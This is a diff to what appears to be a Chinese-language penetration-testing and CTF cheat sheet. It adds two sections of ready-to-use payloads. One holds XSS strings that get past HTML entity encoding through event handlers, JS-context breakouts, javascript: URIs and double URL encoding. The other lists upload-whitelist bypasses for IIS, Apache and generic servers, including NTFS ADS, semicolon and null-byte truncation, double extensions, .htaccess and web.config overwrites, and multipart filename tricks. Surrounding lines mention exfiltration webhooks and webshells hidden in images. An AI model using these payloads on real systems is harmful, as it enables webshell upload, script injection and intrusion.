@@ -646,6 +646,27 @@ fetch(`/getflag\)
   // 開發順序: 先送回應長度確認 fetch → 再送內容片段確認 parse → 最後組完整 payload
   ```
 
+  #### HTML Entity Encode 繞過
+
+  後端把 `<>` 轉成 `&lt;&gt;` 時，tag-based payload 失效。依輸出落點選擇：
+
+  ```js
+  // 1. 落在 HTML attribute 內（引號未 encode）→ 注入 event handler
+  " onfocus=alert(1) autofocus="
+  " onmouseover=alert(1) "
+
+  // 2. 落在 JS context 內 → HTML encode 無意義，直接閉合
+  ";alert(1)//
+  '-alert(1)-'
+
+  // 3. 落在 href/src attribute → javascript: 不需要 <>
+  javascript:alert(1)
+
+  // 4. 雙重 encode / URL encode 繞過（後端只 decode 一次）
+  %3Cimg src=x onerror=alert(1)%3E
+  %253Cimg src=x onerror=alert(1)%253E
+  ```
+
   #### 常用外帶 webhook
   - [Beeceptor](https://beeceptor.com/) — 免費、即時查看 request
   - [Webhook.site](https://webhook.site/) — 免費、支援自訂回應
@@ -1066,6 +1087,54 @@ create 一個偽造的 payload 和一個對外的中間 server 溝通，並讓�
 - 改 Content-Typebypass: `IMAGETYPE`(加入合法的 File Signature) + bypass file type(修改封包 header)
 - 雙重副檔名: `shell.jsp.jpg`（若 server 解析第一個副檔名）或 `shell.jpg.jsp`
 - 如果只能插入在 Image 中，通常會插在 IEND 後面，如果 response 的 Content-Type 不是 `image/png` 而是 `text/html` ，他會執行後面的 webshell payload
+
+</details>
+
+### 副檔名白名單繞過（Extension Whitelist Bypass）
+
+後端只檢查副檔名（不驗內容/Content-Type）時，依環境選擇 payload：
+
+<details markdown="1">
+<summary><span class="spoiler">Payload</span></summary>
+
+**IIS / Windows**
+
+```
+shell.aspx.          → Windows 自動去尾部點，存為 shell.aspx
+shell.aspx(空格)     → Windows 自動去尾部空白，存為 shell.aspx
+shell.aspx::$DATA    → NTFS ADS，Windows 忽略 ::$DATA（部分 .NET 版本會擋 path format）
+shell.aspx;.jpg      → IIS 分號截斷，解析為 shell.aspx（實測 DMS 可繞過白名單，下載後變 .exe）
+shell.AsPx           → 白名單若未 toLower() 即可繞過
+web.config           → 不在白名單但可覆寫 IIS 配置（潛在 RCE）
+shell.cer / .asa     → IIS 預設映射為 ASP handler
+```
+
+**Apache / Linux**
+
+```
+shell.php.jpg        → Apache 若設定 AddHandler，可能以第一個可執行副檔名處理
+shell.php5 / .phtml  → 替代副檔名，若未列入黑名單
+.htaccess            → 上傳自訂 handler 規則
+```
+
+**通用**
+
+```
+shell.aspx%00.jpg    → Null byte 截斷（舊版 PHP < 5.3.4、部分 Java）
+shell.jpg.aspx       → 雙重副檔名，若後端只看第一個點之後的部分
+shell.html / .svg    → 不能 RCE 但可 Stored XSS（svg 可嵌 <script>）
+```
+
+**HTTP 層操作**
+
+```
+filename="shell.aspx"                      → 直接改 filename
+filename ="shell.aspx"                     → key 後加空白
+filename=shell.aspx                        → 去掉引號
+filename="a.jpg"; filename="shell.aspx"    → 重複參數，不同 parser 取不同值
+```
+
+> 實測案例：(IIS/ASP.NET) 白名單 `txt,doc,docx,pdf,xls,xlsx,ppt,pptx,jpg,jpeg,gif,bmp,tiff`，使用 `file.exe;.jpeg` 成功繞過上傳，下載後檔名變回 `file.exe`。
 
 </details>
 
